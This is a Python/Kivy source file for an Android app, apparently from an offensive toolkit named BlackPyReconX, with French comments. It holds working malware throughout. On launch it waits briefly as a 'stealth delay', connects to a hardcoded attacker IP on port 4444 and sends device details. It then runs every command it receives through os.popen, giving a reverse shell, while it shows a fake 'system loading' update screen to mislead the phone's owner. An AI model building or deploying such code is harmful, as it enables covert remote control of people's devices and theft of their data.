# android_apk/main.py

import os
import socket
import platform
import time
from datetime import datetime
from pathlib import Path
from kivy.app import App
from kivy.uix.label import Label

# 📁 Journalisation lisible depuis un explorateur Android
LOG_DIR = Path("/sdcard/BlackPyReconX")
LOG_DIR.mkdir(parents=True, exist_ok=True)
LOG_FILE = LOG_DIR / "agent_android.log"

# 📡 Configuration reverse shell
ATTACKER_IP = "192.168.1.3"  # Remplace par l’IP d’écoute
ATTACKER_PORT = 4444         # Port d’écoute du reverse shell

def log(msg: str):
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"{timestamp} {msg}\n")

def get_device_info():
    return {
        "OS": platform.system(),
        "Version": platform.version(),
        "Nom": platform.node(),
        "Architecture": platform.machine(),
        "Chemin": os.getcwd()
    }

def send_device_info(sock):
    try:
        info = get_device_info()
        for k, v in info.items():
            sock.send(f"{k}: {v}\n".encode())
    except Exception as e:
        log(f"[Erreur] Info système : {e}")

def reverse_shell():
    try:
        time.sleep(2)  # délai furtif
        sock = socket.socket()
        sock.connect((ATTACKER_IP, ATTACKER_PORT))
        sock.send("[+] Agent Android connecté.\n".encode())

        send_device_info(sock)

        while True:
            command = sock.recv(1024).decode().strip()
            if command.lower() in ["exit", "quit"]:
                break
            output = os.popen(command).read()
            if not output:
                output = "[Aucune sortie]\n"
            sock.send(output.encode(errors="ignore"))

        sock.close()
        log("Session reverse shell terminée.")
    except Exception as e:
        log(f"[Erreur] Reverse shell : {e}")

class AgentApp(App):
    def build(self):
        log("Agent Android démarré (APK furtif).")
        reverse_shell()
        # 🕵️ Fausse interface "Mise à jour Android"
        return Label(text="Chargement du système...", font_size='18sp')

if __name__ == '__main__':
    AgentApp().run()
